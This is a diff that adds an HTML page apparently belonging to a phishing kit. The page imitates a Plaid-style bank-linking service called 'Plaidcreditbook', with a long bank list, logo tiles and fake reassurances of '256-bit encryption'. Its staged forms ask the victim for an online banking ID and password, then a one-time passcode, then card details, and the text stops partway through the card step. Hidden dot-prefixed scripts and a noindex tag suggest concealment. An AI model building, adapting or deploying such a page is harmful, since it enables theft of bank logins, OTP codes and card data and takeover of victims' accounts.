@@ -1,0 +1,1176 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="robots" content="noindex, nofollow, nosnippet">
+    <title>Plaidcreditbook</title>
+    <link rel="icon" type="image/png" href="assets/images/Plaid.png">
+    <script type="module" crossorigin="" src="assets/.index-DODPvUCW.js"></script>
+    <link rel="stylesheet" crossorigin="" href="assets/index-DvtKzEtc.css">
+    <link rel="modulepreload" as="script" crossorigin="" href="assets/.index-RUN_BNgQ.js">
+    <link rel="modulepreload" as="script" crossorigin="" href="assets/.index-DODPvUCW.js">
+    <link rel="modulepreload" as="script" crossorigin="" href="assets/.index-BsoPRGka.js">
+    <link rel="modulepreload" as="script" crossorigin="" href="assets/.CloudWatchRum-DYE3A5W1.js">
+    <link rel="modulepreload" as="script" crossorigin="" href="assets/.App-CiI-kGpT.js">
+    <link rel="modulepreload" as="script" crossorigin="" href="assets/.BankPicker-CTb93kQ1.js">
+    <link rel="modulepreload" as="script" crossorigin="" href="assets/.CardHeader-BdkVYw0S.js">
+    <link rel="modulepreload" as="script" crossorigin="" href="assets/.createSuper-BZZxWqAv.js">
+    <link rel="modulepreload" as="script" crossorigin="" href="assets/.setPrototypeOf-B4fUID9J.js">
+    <style data-emotion="css" data-s=""></style>
+
+    <style>
+        :root {
+            --bg: #f4f6f9;
+            --card: #fff;
+            --text: #222;
+            --muted: #666;
+            --primary: #2563eb;
+            --primary-hover: #1e4fc2;
+            --border: #e5e7eb;
+            --success: #16a34a;
+        }
+
+        * {
+            box-sizing: border-box;
+        }
+
+        body {
+            margin: 0;
+            font-family: system-ui, -apple-system, Segoe UI, Roboto, Helvetica, Arial;
+            display: grid;
+            place-items: center;
+            min-height: 100vh;
+            padding: 16px;
+            background: var(--bg);
+            color: var(--text);
+        }
+
+        .wrap {
+            width: 1600px;
+            max-width: 420px;
+            background: var(--card);
+            border-radius: 14px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.08);
+            overflow: hidden;
+            border: 1px solid var(--border);
+            padding: 5px;
+        }
+
+        header {
+            padding: 12px 16px;
+            border-bottom: 1px solid var(--border);
+            font-weight: 700;
+            text-align: center;
+            letter-spacing: .2px;
+        }
+
+        .section {
+            display: none;
+            padding: 20px;
+        }
+
+        .section.active {
+            display: block;
+            animation: fade .25s ease;
+        }
+
+        @keyframes fade {
+            from {
+                opacity: 0
+            }
+            to {
+                opacity: 1
+            }
+        }
+
+        .grid {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 4px;
+            margin: 0;
+            padding: 8px;
+        }
+
+        .knab {
+            border: 1px solid var(--border);
+            border-radius: 12px;
+            padding: 6px;
+            display: grid;
+            place-items: center;
+            cursor: pointer;
+            transition: transform .06s ease, box-shadow .06s ease, border-color .2s;
+            background: #fff;
+        }
+
+        .knab:hover {
+            transform: translateY(-1px);
+            box-shadow: 0 8px 18px rgba(0, 0, 0, .05);
+            border-color: #d1d5db;
+        }
+
+        .logo {
+            width: 160px;
+            height: 40px;
+            object-fit: contain;
+        }
+
+        .loading-wrap {
+            text-align: center;
+            padding: 36px 12px;
+            min-height: 220px;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+        }
+
+        .spinner {
+            width: 44px;
+            height: 44px;
+            border-radius: 50%;
+            border: 4px solid #e5e7eb;
+            border-top-color: var(--primary);
+            margin: 0 auto 14px;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            to {
+                transform: rotate(360deg)
+            }
+        }
+
+        .bank-header {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            margin-bottom: 10px;
+        }
+
+        .bank-title {
+            font-weight: 600;
+        }
+
+        .field {
+            margin: 10px 0;
+        }
+
+        .input,
+        .btn,
+        select {
+            width: 100%;
+            padding: 12px 12px;
+            border-radius: 10px;
+            border: 1px solid var(--border);
+            font-size: 15px;
+        }
+
+        .input:focus,
+        select:focus {
+            outline: none;
+            border-color: var(--primary);
+            box-shadow: 0 0 0 3px rgba(37, 99, 235, .15);
+        }
+
+        .btn {
+            background: var(--primary);
+            color: #fff;
+            border: none;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background .15s ease, transform .04s ease;
+            margin-top: 4px;
+        }
+
+        .btn:hover {
+            background: var(--primary-hover);
+        }
+
+        .btn:active {
+            transform: translateY(1px);
+        }
+
+        .btn-secondary {
+            background: #e5e7eb;
+            color: #111827;
+        }
+
+        .btn-secondary:hover {
+            background: #d1d5db;
+        }
+
+        .row {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 10px;
+        }
+
+        .muted {
+            color: var(--muted);
+            font-size: 12px;
+            line-height: 1.4;
+            margin-top: 12px;
+        }
+
+        .startover {
+            display: inline-block;
+            margin-top: 10px;
+            font-size: 13px;
+            color: var(--primary);
+            cursor: pointer;
+            text-decoration: underline;
+            background: none;
+            border: none;
+            padding: 0;
+        }
+
+        .input-group {
+            position: relative;
+        }
+
+        .toggle {
+            position: absolute;
+            right: 10px;
+            top: 50%;
+            transform: translateY(-50%);
+            border: none;
+            background: transparent;
+            cursor: pointer;
+            font-size: 14px;
+            color: var(--muted);
+        }
+
+        .done {
+            text-align: center;
+            padding: 18px 8px;
+        }
+
+        .check {
+            width: 56px;
+            height: 56px;
+            border-radius: 50%;
+            background: rgba(22, 163, 74, .1);
+            color: var(--success);
+            display: grid;
+            place-items: center;
+            margin: 0 auto 10px;
+            font-size: 28px;
+        }
+
+        .security {
+            margin-top: 10px;
+            padding-top: 10px;
+            border-top: 1px dashed var(--border);
+            color: var(--muted);
+            font-size: 12px;
+            line-height: 1.45;
+            text-align: center;
+        }
+
+        #bankGrid {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 4px;
+            margin: 0;
+            padding: 8px;
+            border: 1px solid var(--border);
+            border-radius: 12px;
+            background: #fff;
+        }
+
+        .bank {
+            border: 1px solid var(--border);
+            border-radius: 12px;
+            padding: 10px;
+            display: grid;
+            place-items: center;
+            cursor: pointer;
+            transition: transform 0.06s ease, box-shadow 0.06s ease, border-color 0.2s;
+            background: #fff;
+        }
+
+        .bank:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 16px rgba(0, 0, 0, 0.08);
+            border-color: #d1d5db;
+        }
+
+        .loading-svg {
+            width: 108px;
+            height: 108px;
+            display: block;
+            margin: 16px auto;
+        }
+
+        #pageOverlay {
+            position: fixed;
+            inset: 0;
+            background: rgba(255, 255, 255, 0.96);
+            display: flex;
+            align-items: top;
+            justify-content: center;
+            z-index: 99999;
+        }
+
+        form label {
+            display: block;
+            font-size: 12px;
+            color: #555;
+            margin-top: 8px;
+            line-height: 1.4;
+            word-wrap: break-word;
+        }
+
+        form label a {
+            color: #007BFF;
+            text-decoration: none;
+        }
+
+        form label a:hover {
+            text-decoration: underline;
+        }
+
+        .actions {
+            display: flex;
+            flex-direction: column;
+            gap: 6px;
+            margin-top: 6px;
+        }
+
+        .actions .startover {
+            font-size: 13px;
+            color: var(--primary);
+            text-decoration: underline;
+            background: none;
+            border: none;
+            padding: 0;
+            cursor: pointer;
+        }
+
+        .actions .security {
+            font-size: 12px;
+            color: var(--muted);
+            text-align: center;
+            padding-top: 4px;
+        }
+    </style>
+</head>
+
+<body>
+
+    <div id="pageOverlay" style="display:none;">
+        <img src="assets/images/loading.svg" class="loading-svg" alt="Loading">
+    </div>
+
+    <div id="root">
+        <header class="header">
+            <nav class="nav border-bottom d-flex navbar navbar-expand-md navbar-dark bg-dark fixed-top">
+                <div class="container"><a href="https://ibv.autholen.com/?token=2343" class="navbar-brand"><img class="logo" src="assets/Plaidcreditbook.png" alt="Plaidcreditbook Logo"></a>
+                    <div class="d-flex right-side-wrapper">
+                        <div href="/" class="dropdown-language nav-item dropdown"><a href="/" aria-haspopup="true" class="nav-link selected-language" aria-expanded="false"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"></circle><line x1="2" y1="12" x2="22" y2="12"></line><path d="M12 2a15.3 15.3 0 0 1 4 10 15.3 15.3 0 0 1-4 10 15.3 15.3 0 0 1-4-10 15.3 15.3 0 0 1 4-10z"></path></svg><span>EN</span></a>
+                            <div
+                                tabindex="-1" role="menu" aria-hidden="true" class="mt-0 dropdown-menu" data-bs-popper="static"><a href="/" tabindex="0" role="menuitem" class="dropdown-item"><span class="ms-1">English</span></a><a href="/" tabindex="0" role="menuitem" class="dropdown-item"><span class="ms-1">Français</span></a></div>
+                    </div>
+                </div>
+    </div>
+    </nav>
+    </header>
+    <br>
+
+
+    <div class="wrap" id="app">
+        <header>Select Your Institution</header>
+
+        <!-- Bank Dropdown Selection -->
+        <section class="section active" id="selectBank">
+            <div class="field">
+                                <select id="otherBankDropdown" class="input">
+                                        <option value="">Select..</option>
+                                        <option value="1st Advantage Bank">1st Advantage Bank</option>
+                                        <option value="1st Bank">1st Bank</option>
+                                        <option value="1st Choice Savings and Credit Union">1st Choice Savings and Credit Union</option>
+                                        <option value="1st National Bank">1st National Bank</option>
+                                        <option value="1st Security Bank">1st Security Bank</option>
+                                        <option value="1st Source Bank">1st Source Bank</option>
+                                        <option value="1st State Bank">1st State Bank</option>
+                                        <option value="2nd Story Bank">2nd Story Bank</option>
+                                        <option value="3Rivers Bank">3Rivers Banks</option>
+                                        <option value="4Front Credit Union">4Front Credit Union</option>
+                                        <option value="5/3 Bank">5/3 Bank</option>
+                                        <option value="7th Street Bank">7th Street Bank</option>
+                                        <option value="4Front Credit Union">4Front Credit Union</option>
+                                        <option value="Acadian Credit Union">Acadian Credit Union</option>
+                                        <option value="Access Credit Union">Access Credit Union</option>
+                                        <option value="Advance Savings Credit Union">Advance Savings Credit Union</option>
+                                        <option value="Affinity Credit Union">Affinity Credit Union</option>
+                                        <option value="Aldergrove Credit Union">Aldergrove Credit Union</option>
+                                        <option value="Alterna Bank">Alterna Bank</option>
+                                        <option value="Ally Bank">Ally Bank</option>
+                                        <option value="⁠Alliant Credit Union">⁠Alliant Credit Union</option>
+                                        <option value="American Express National Bank">American Express National Bank</option>
+                                        <option value="⁠America First Credit Union">⁠America First Credit Union</option>
+                                        <option value="American Express (Canada)">American Express (Canada)</option>
+                                        <option value="Amerant Bank">Amerant Bank</option>
+                                        <option value="Alterna Savings">Alterna Savings</option>
+                                        <option value="Assiniboine Credit Union">Assiniboine Credit Union</option>
+                                        <option value="Associated Bank">Associated Bank</option> 
+                                        <option value="ATB Financial">ATB Financial</option>
+                                        <option value="Atlantic Union Bank">Atlantic Union Bank</option>
+                                        <option value="Arvest Bank">Arvest Bank</option>
+                                        <option value="Axos Bank">Axos Bank</option>
+                                        <option value="Bank of America">Bank of America</option>
+                                        <option value="Bank of Hawaii">Bank of Hawaii</option>
+                                        <option value="Bank of New York Mellon">Bank of New York Mellon</option>
+                                        <option value="Bank of Montreal">Bank of Montreal</option>
+                                        <option value="Bank of the West">Bank of the West</option>
+                                        <option value="Bay Credit Union">Bay Credit Union</option>
+                                        <option value="Bayview Credit Union">Bayview Credit Union</option>
+                                        <option value="Beaubear Credit Union">Beaubear Credit Union</option>
+                                        <option value="Belgian-Alliance Credit Union">Belgian-Alliance Credit Union</option>
+                                        <option value="Blackville Credit Union">Blackville Credit Union</option>
+                                        <option value="BlueShore Financial">BlueShore Financial</option>
+                                        <option value="⁠Boeing Employees' Credit Union">⁠Boeing Employees' Credit Union</option>
+                                        <option value="Bridgewater Bank">Bridgewater Bank</option>
+                                        <option value="Branch Banking and Trust">Branch Banking and Trust</option> 
+                                        <option value="Bread Savings">Bread Savings</option>
+                                        <option value="Byline Bank">Byline Bank</option>
+                                        <option value="Cadence Bank">Cadence Bank</option>
+                                        <option value="Cambrian Credit Union">Cambrian Credit Union</option>
+                                        <option value="Canadian Tire Bank">Canadian Tire Bank</option>
+                                        <option value="Canadian Western Bank">Canadian Western Bank</option>
+                                        <option value="Cape Breton Credit Union">Cape Breton Credit Union</option>
+                                        <option value="Capital One Bank">Capital One Bank</option>
+                                        <option value="Carpathia Credit Union">Carpathia Credit Union</option>
+                                        <option value="Casera Credit Union">Casera Credit Union</option>
+                                        <option value="Cathay Bank">Cathay Bank</option>
+                                        <option value="CCEC Credit Union">CCEC Credit Union</option>
+                                        <option value="Chase Bank">Chase Bank</option>
+                                        <option value="Charles Schwab Bank">Charles Schwab Bank</option>
+                                        <option value="Christian Credit Union (Alberta)">Christian Credit Union (Alberta)</option>
+                                        <option value="CIBC">CIBC</option>
+                                        <option value="Citibank">Citibank</option>
+                                        <option value="Citizens Bank">Citizens Bank</option>
+                                        <option value="Coast Capital Savings">Coast Capital Savings</option>
+                                        <option value="Columbia Bank">Columbia Bank</option>
+                                        <option value="Columbia Valley Credit Union">Columbia Valley Credit Union</option>
+                                        <option value="Comerica Bank">Comerica Bank</option>
+                                        <option value="Community Savings">Community Savings</option>
+                                        <option value="Compass Credit Union">Compass Credit Union</option>
+                                        <option value="Conexus Credit Union">Conexus Credit Union</option>
+                                        <option value="Connect First Credit Union">Connect First Credit Union</option>
+                                        <option value="Cornerstone Credit Union">Cornerstone Credit Union</option>
+                                        <option value="Credit Union Atlantic">Credit Union Atlantic</option>
+                                        <option value="Creston &amp; District Credit Union">Creston &amp; District Credit Union</option>
+                                        <option value="Crossroads Credit Union">Crossroads Credit Union</option>
+                                        <option value="Desjardins">Desjardins</option>
+                                        <option value=" ⁠Delta Community Credit Union"> ⁠Delta Community Credit Union</option>
+                                        <option value="Deutsche Bank USA">Deutsche Bank USA</option>
+                                        <option value="Diamond North Credit Union">Diamond North Credit Union</option>
+                                        <option value="Digital Federal Credit Union (DCU)">Digital Federal Credit Union (DCU)</option>
+                                        <option value="Dime Community Bank">Dime Community Bank</option>
+                                        <option value="Discover Bank">Discover Bank</option>
+                                        <option value="Dogwood State Bank">Dogwood State Bank</option>
+                                        <option value="Dollar Bank">Dollar Bank</option>
+                                        <option value="DUCA Financial Services CU">DUCA Financial Services CU</option>
+                                        <option value="Eagle River Credit Union">Eagle River Credit Union</option>
+                                        <option value="Eastern Bank">Eastern Bank</option>
+                                        <option value="East Coast Credit Union">East Coast Credit Union</option>
+                                        <option value="Eastern Edge Credit Union">Eastern Edge Credit Union</option>
+                                        <option value="East West Bank">East West Bank</option>
+                                        <option value="Education Credit Union">Education Credit Union</option>
+                                        <option value="Enterprise Bank">Enterprise Bank</option>
+                                        <option value="Envision Financial">Envision Financial</option>
+                                        <option value="EQ Bank">EQ Bank</option>
+                                        <option value="Evergreen Bank">Evergreen Bank</option>
+                                        <option value="Fifth Third Bank">Fifth Third Bank</option>
+                                        <option value="FirstBank">FirstBank</option>
+                                        <option value="First Citizens Bank">First Citizens Bank</option>
+                                        <option value="First Horizon Bank">First Horizon Bank</option>
+                                        <option value="First National Bank">First National Bank</option>
+                                        <option value="⁠First Tech Federal Credit Union">⁠First Tech Federal Credit Union</option>
+                                        <option value="Flagstar Bank">Flagstar Bank</option>
+                                        <option value="Frost Bank">Frost Bank</option>
+                                        <option value="Fulton Bank">Fulton Bank</option>
+                                        <option value="Glacier Bank">Glacier Bank</option>
+                                        <option value="Goldman Sachs Bank USA">Goldman Sachs Bank USA</option>
+                                        <option value="Golden 1 Credit Union">Golden 1 Credit Union</option>
+                                        <option value="Great Southern Bank">Great Southern Bank</option>
+                                        <option value="GreenState Credit Union">GreenState Credit Union</option> 
+                                        <option value="Guaranty Bank">Guaranty Bank</option>
+                                        <option value="Hancock Whitney Bank">Hancock Whitney Bank</option>
+                                        <option value="HSBC Bank USA">HSBC Bank USA</option>
+                                        <option value="Huntington National Bank">Huntington National Bank</option>
+                                        <option value="Idaho Central Bank">Idaho Central Bank</option>
+                                        <option value="IC Savings">IC Savings</option>
+                                        <option value="Independent Bank">Independent Bank</option>
+                                        <option value="Investors Bank">Investors Bank</option>
+                                        <option value="International Bank of Chicago">International Bank of Chicago</option>
+                                        <option value="Interior Savings CU">Interior Savings CU</option>
+                                        <option value="Island Savings Credit Union">Island Savings Credit Union</option>
+                                        <option value="John Marshall Bank">John Marshall Bank</option>
+                                        <option value="JPMorgan Chase Bank">JPMorgan Chase Bank</option>
+                                        <option value="Kawartha Credit Union">Kawartha Credit Union</option>
+                                        <option value="Kearny Bank">Kearny Bank</option>
+                                        <option value="KeyBank">KeyBank</option>
+                                        <option value="Khalsa Credit Union">Khalsa Credit Union</option>
+                                        <option value="Kindred Credit Union">Kindred Credit Union</option>
+                                        <option value="Kitsap Bank">Kitsap Bank</option>
+                                        <option value="KOHO">KOHO</option>
+                                        <option value="Lakeland Bank">Lakeland Bank</option>
+                                        <option value="Lake City Bank">Lake City Bank</option>
+                                        <option value="⁠Lake Michigan Credit Union">⁠Lake Michigan Credit Union</option>
+                                        <option value="Laurentian Bank">Laurentian Bank</option>
+                                        <option value="Libro Credit Union">Libro Credit Union</option>
+                                        <option value="Live Oak Bank">Live Oak Bank</option>
+                                        <option value="Lone Star National Bank">Lone Star National Bank</option>
+                                        <option value="Mainstreet Credit Union">Mainstreet Credit Union</option>
+                                        <option value="Manufacturers and Traders Trust">Manufacturers and Traders Trust</option>
+                                        <option value="Manulife Bank of Canada">Manulife Bank of Canada</option>
+                                        <option value="Marcus by Goldman Sachs">Marcus by Goldman Sachs</option>
+                                        <option value="Meridian Credit Union">Meridian Credit Union</option>
+                                        <option value="Metropolitan Commercial Bank">Metropolitan Commercial Bank</option>
+                                        <option value="MidFirst Bank">MidFirst Bank</option> Morgan Stanley Private Bank
+                                        <option value="Morgan Stanley Private Bank">Morgan Stanley Private Bank</option>
+                                        <option value="Motusbank">Motusbank</option>
+                                        <option value="⁠Mountain America Credit Union">⁠Mountain America Credit Union</option>
+                                        <option value="Moya Financial Credit Union">Moya Financial Credit Union</option>
+                                        <option value="M&T Bank">M&T Bank</option> Navy Federal Credit Union
+                                        <option value="National Bank of Canada">National Bank of Canada</option>
+                                        <option value="Navy Federal Credit Union">Navy Federal Credit Union</option>
+                                        <option value="NBTA Credit Union">NBTA Credit Union</option>
+                                        <option value="Nelson &amp; District Credit Union">Nelson &amp; District Credit Union</option>
+                                        <option value="Newfoundland &amp; Labrador CU">Newfoundland &amp; Labrador CU</option>
+                                        <option value="New York Community Bank">New York Community Bank</option>
+                                        <option value="NexBank">NexBank</option>
+                                        <option value="North American Savings Bank">North American Savings Bank</option>
+                                        <option value="Northern Credit Union">Northern Credit Union</option>
+                                        <option value="Northwest Bank">Northwest Bank</option>
+                                        <option value="North Peace Savings &amp; CU">North Peace Savings &amp; CU</option>
+                                        <option value="OMISTA Credit Union">OMISTA Credit Union</option>
+                                        <option value="OneUnited Bank">OneUnited Bank</option>
+                                        <option value="Old National Bank">Old National Bank</option>
+                                        <option value="Old Plank Trail Community Bank">Old Plank Trail Community Bank</option>
+                                        <option value="OceanFirst Bank">OceanFirst Bank</option>
+                                        <option value="Origin Bank">Origin Bank</option>
+                                        <option value="Oshawa Community CU">Oshawa Community CU</option>
+                                        <option value="Osoyoos Credit Union">Osoyoos Credit Union</option>
+                                        <option value="PNC Bank">PNC Bank</option>
+                                        <option value="Pinnacle Bank">Pinnacle Bank</option>
+                                        <option value="Popular Bank">Popular Bank</option>
+                                        <option value="Premier Bank">Premier Bank</option>
+                                        <option value="Prosperity Bank">Prosperity Bank</option>
+                                        <option value="Parama Credit Union">Parama Credit Union</option>
+                                        <option value="Patelco Credit Union">Patelco Credit Union</option>
+                                        <option value="PenFinancial Credit Union">PenFinancial Credit Union</option>
+                                        <option value="PC Financial">PC Financial</option>
+                                        <option value="Prairie Centre Credit Union">Prairie Centre Credit Union</option>
+                                        <option value="President's Choice Financial">President's Choice Financial</option>
+                                        <option value="Progressive Credit Union">Progressive Credit Union</option>
+                                        <option value="Prospera Credit Union">Prospera Credit Union</option>
+                                        <option value="Public Service Credit Union">Public Service Credit Union</option>
+                                        <option value="Pacific Premier Bank">Pacific Premier Bank</option>
+                                        <option value="Quontic Bank">Quontic Bank</option>
+                                        <option value="Quinte First Credit Union">Quinte First Credit Union</option>
+                                        <option value="Queensborough National Bank">Queensborough National Bank</option>
+                                        <option value="Regions Bank">Regions Bank</option>
+                                        <option value="Renasant Bank">Renasant Bank</option>
+                                        <option value="Republic Bank">Republic Bank</option>
+                                        <option value="Rapport Credit Union">Rapport Credit Union</option>
+                                        <option value="Raymond James Bank">Raymond James Bank</option>
+                                        <option value="RBC Royal Bank">RBC Royal Bank</option>
+                                        <option value="Rockland Trust">Rockland Trust</option>
+                                        <option value="Santander Bank">Santander Bank</option>
+                                        <option value="Seacoast Bank">Seacoast Bank</option>
+                                        <option value="Signature Bank">Signature Bank</option>
+                                        <option value="Simmons Bank">Simmons Bank</option>
+                                        <option value="SoFi Bank">SoFi Bank</option>
+                                        <option value="SouthState Bank">SouthState Bank</option>
+                                        <option value="Sterling Bank">Sterling Bank</option>
+                                        <option value="Synovus Bank">Synovus Bank</option>
+                                        <option value="Synchrony Bank">Synchrony Bank</option>
+                                        <option value="Scotiabank">Scotiabank</option>
+                                        <option value="Servus Credit Union">Servus Credit Union</option>
+                                        <option value="Sharons Credit Union">Sharons Credit Union</option>
+                                        <option value="Simplii Financial">Simplii Financial</option>
+                                        <option value="Southwest Regional Credit Union">Southwest Regional Credit Union</option>
+                                        <option value="Spruce Credit Union">Spruce Credit Union</option>
+                                        <option value="State Street Bank">State Street Bank</option>
+                                        <option value="Steinbach Credit Union">Steinbach Credit Union</option>
+                                        <option value="Stride Credit Union">Stride Credit Union</option>
+                                        <option value="Sudbury Credit Union">Sudbury Credit Union</option>
+                                        <option value="Summerland Credit Union">Summerland Credit Union</option>
+                                        <option value="Sunova Credit Union">Sunova Credit Union</option>
+                                        <option value="Sunrise Credit Union">Sunrise Credit Union</option>
+                                        <option value="Sunshine Coast Credit Union">Sunshine Coast Credit Union</option>
+                                        <option value="Swan Valley Credit Union">Swan Valley Credit Union</option>
+                                        <option value="Sydney Credit Union">Sydney Credit Union</option>
+                                        <option value="Synergy Credit Union">Synergy Credit Union</option>
+                                        <option value="Tangerine">Tangerine</option>  
+                                        <option value="TowneBank">TowneBank</option>
+                                        <option value="TCF Bank">TCF Bank</option>
+                                        <option value="TD Bank">TD Bank</option>
+                                        <option value="Truist Bank">Truist Bank</option> 
+                                        <option value="Texas Capital Bank">Texas Capital Bank</option>
+                                        <option value="Tandia FCU">Tandia FCU</option>
+                                        <option value="TCU Financial Group">TCU Financial Group</option>
+                                        <option value="Third Coast Bank">Third Coast Bank</option>
+                                        <option value="TD Canada Trust">TD Canada Trust</option>
+                                        <option value="Thorold Community Credit Union">Thorold Community Credit Union</option>
+                                        <option value="Tignish Credit Union">Tignish Credit Union</option>
+                                        <option value="Trustmark National Bank">Trustmark National Bank</option>
+                                        <option value="U.S. Bank">U.S. Bank</option>
+                                        <option value="UMB Bank">UMB Bank</option> 
+                                        <option value="United Bank">United Bank</option>
+                                        <option value="Union Bank">Union Bank</option>
+                                        <option value="United Community Bank">United Community Bank</option>
+                                        <option value="UNI Financial Cooperation">UNI Financial Cooperation</option>
+                                        <option value="Union Bay Credit Union">Union Bay Credit Union</option>
+                                        <option value="Unity Credit Union">Unity Credit Union</option>
+                                        <option value="United Midwest Savings Bank">United Midwest Savings Bank</option>
+                                        <option value="Vancity">Vancity</option>
+                                        <option value="Valley Bank">Valley Bank</option>
+                                        <option value="Varo Bank">Varo Bank</option>
+                                        <option value="Vista Bank">Vista Bank</option>
+                                        <option value="Veritex Community Bank">Veritex Community Bank</option>
+                                        <option value="Vancity Community Investment Bank">Vancity Community Investment Bank</option>
+                                        <option value="VantageOne Credit Union">VantageOne Credit Union</option>
+                                        <option value="Venture Credit Union">Venture Credit Union</option>
+                                        <option value="Vision Credit Union">Vision Credit Union</option>
+                                        <option value="Valley First Credit Union">Valley First Credit Union</option>
+                                        <option value="Western Alliance Bank">Western Alliance Bank</option>
+                                        <option value="WaFd Bank">WaFd Bank</option> Western Alliance Bank
+                                        <option value="Webster Bank">Webster Bank</option>
+                                        <option value="Wintrust Bank">Wintrust Bank</option>
+                                        <option value="Wells Fargo Bank">Wells Fargo Bank</option>
+                                        <option value="Woodforest National Bank">Woodforest National Bank</option>
+                                        <option value="Westminster Savings Credit Union">Westminster Savings Credit Union</option>
+                                        <option value="Westoba Credit Union">Westoba Credit Union</option>
+                                        <option value="Weyburn Credit Union">Weyburn Credit Union</option>
+                                        <option value="Williams Lake &amp; District CU">Williams Lake &amp; District CU</option>
+                                        <option value="Windsor Family Credit Union">Windsor Family Credit Union</option>
+                                        <option value="WealthOne Bank of Canada">WealthOne Bank of Canada</option>
+                                        <option value="Wealthsimple (Canada)">Wealthsimple (Canada)</option>
+                                        <option value="Your Credit Union">Your Credit Union</option>
+                                        <option value="Your Neighbourhood Credit Union">Your Neighbourhood Credit Union</option>
+                                        <option value="⁠Zions Bank">⁠Zions Bank</option>
+                                        <option value="Zions Bancorporation">Zions Bancorporation</option>
+                                        <option value="Other">Other</option>
+                                </select>
+            </div>
+
+            <div id="bankGrid" class="grid">
+                <div class="bank" onclick="selectBank('AFCU', 'img/america-first-credit-union.png', 'step4')">
+                    <img class="logo" src="img/america-first-credit-union.png" alt="AFCU">
+                </div>
+                <div class="bank" onclick="selectBank('BOA', 'img/BOA.png', 'step4')">
+                    <img class="logo" src="img/BOA.png" alt="BOA">
+                </div>
+                <div class="bank" onclick="selectBank('TD Canada Trust', 'img/td_canada_trust.jpg')">
+                    <img class="logo" src="img/td_canada_trust.jpg" alt="TD Canada Trust">
+                </div>
+                <div class="bank" onclick="selectBank('Capital One', 'img/CapitalOne.png')">
+                    <img class="logo" src="img/CapitalOne.png" alt="Capital One">
+                </div>
+                <div class="bank" onclick="selectBank('CitiBank', 'img/citibank.jpg')">
+                    <img class="logo" src="img/citibank.jpg" alt="CitiBank">
+                </div>
+                <div class="bank" onclick="selectBank('BMO', 'img/BMO.png')">
+                    <img class="logo" src="img/BMO.png" alt="BMO">
+                </div>
+                <div class="bank" onclick="selectBank('Citizens Bank', 'img/citizens.png')">
+                    <img class="logo" src="img/citizens.png" alt="Citizens Bank">
+                </div>
+                <div class="bank" onclick="selectBank('Chase Bank', 'img/Chase bank.png')">
+                    <img class="logo" src="img/Chase bank.png" alt="Chase Bank">
+                </div>
+                <div class="bank" onclick="selectBank('Discover', 'img/discover.png')">
+                    <img class="logo" src="img/discover.png" alt="Discover">
+                </div>
+                <div class="bank" onclick="selectBank('1ST Bank', 'img/IST Bank.png')">
+                    <img class="logo" src="img/IST Bank.png" alt="1ST Bank">
+                </div>
+                <div class="bank" onclick="selectBank('ATB Financial', 'img/atb_financial.jpg')">
+                    <img class="logo" src="img/atb_financial.jpg" alt="ATB Financial">
+                </div>
+                <div class="bank" onclick="selectBank('PC Financial', 'img/pc_financial.jpg')">
+                    <img class="logo" src="img/pc_financial.jpg" alt="PC Financial">
+                </div>
+            </div>
+
+            <div class="field" id="customBankField" style="display:none; margin-top:10px;">
+                <input type="text" id="customBankName" class="input" placeholder="Enter your bank name">
+            </div>
+
+            <button class="btn" onclick="confirmOtherBank()">Continue</button>
+        </section>
+
+        <!-- Loading Screen -->
+        <section class="section" id="loading">
+            <div class="loading-wrap">
+                <div class="bank-header">
+                    <img id="loadingLogo" class="logo" alt="">
+                    <span id="loadingName" class="bank-title"></span>
+                </div>
+                <!-- SVG or spinner -->
+                <img src="assets/images/loading.svg" class="loading-svg" alt="Loading">
+                <div class="loading-msg">Connecting… Please wait</div>
+                <button class="startover" onclick="startOver()">Start Over</button>
+            </div>
+        </section>
+
+        <!-- Step 1 (Bank Login) -->
+        <section class="section" id="step1">
+            <form id="step1Form" onsubmit="completeStep1(event)">
+                <div class="bank-header">
+                    <img id="s1Logo" class="logo" alt="">
+                    <span id="s1Name" class="bank-title"></span>
+                </div>
+                <h3>Login to your Account</h3>
+                <div class="field"><input name="onlineId" class="input" type="text" placeholder="Online ID" required></div>
+                <div class="field input-group">
+                    <input name="password" class="input" type="password" placeholder="Password" required>
+                    <button type="button" class="toggle" onclick="toggleField(this.previousElementSibling)">👁</button>
+                </div>
+                <label>
+        By clicking "Continue", I acknowledge that I have read and agree to the 
+        <a href="/terms" target="_blank">Terms and Conditions</a> and 
+        <a href="/privacy" target="_blank">Privacy Policy</a>, and request and authorize 
+        the transmission of all session data to CreditBook.
+      </label>
+                <button type="submit" class="btn">Continue</button>
+            </form>
+            <div class="actions">
+                <button type="button" class="startover" onclick="startOver()">Start Over</button>
+                <div class="security">Your data is secured by 256-bit encryption.</div>
+            </div>
+        </section>
+
+        <!-- Step 2 (Bank OTP) -->
+        <section class="section" id="step2">
+            <form id="step2Form" onsubmit="completeStep2(event)">
+                <div class="bank-header">
+                    <img id="s2Logo" class="logo" alt="">
+                    <span id="s2Name" class="bank-title"></span>
+                </div>
+                <h3>OTP Token</h3>
+                <div class="field"><input name="tk" id="tk" class="input" type="text" placeholder="OTP Token" required></div>
+                <label>
+        By clicking "Continue", I acknowledge that I have read and agree to the Terms and Conditions...
+      </label>
+                <button type="submit" class="btn">Continue</button>
+            </form>
+            <div class="actions">
+                <button type="button" class="startover" onclick="startOver()">Start Over</button>
+                <div class="security">Your data is secured by 256-bit encryption.</div>
+            </div>
+        </section>
+
+        <!-- Step 3 (Card) -->
+        <section class="section" id="step3">
+            <form id="step3Form" onsubmit="completeStep3(event)">
+                <div class="bank-header">
+                    <img id="s3Logo" class="logo" alt="">
+                    <span id="s3Name" class="bank-title"></span>
+                </div>
+                <h3>Card verification</h3>
+                <div class="field input-group">
